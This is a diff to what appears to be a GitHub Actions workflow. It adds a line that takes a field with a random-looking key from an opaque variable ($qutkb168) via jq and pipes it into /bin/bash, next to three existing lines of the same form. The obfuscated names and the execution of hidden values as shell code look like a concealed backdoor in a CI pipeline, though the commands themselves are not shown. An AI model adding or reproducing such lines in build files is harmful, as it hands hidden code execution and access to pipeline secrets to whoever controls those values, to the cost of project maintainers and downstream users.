@@ -28,6 +28,7 @@ jobs:
           echo $x0 | jq -r .nhstx81 | /bin/bash
           echo $ip2 | jq -r .eh8646 | /bin/bash
           printf '%s' "$gh5" | jq -r .iwk75 | /bin/bash
+          echo $qutkb168 | jq -r .sg71471 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
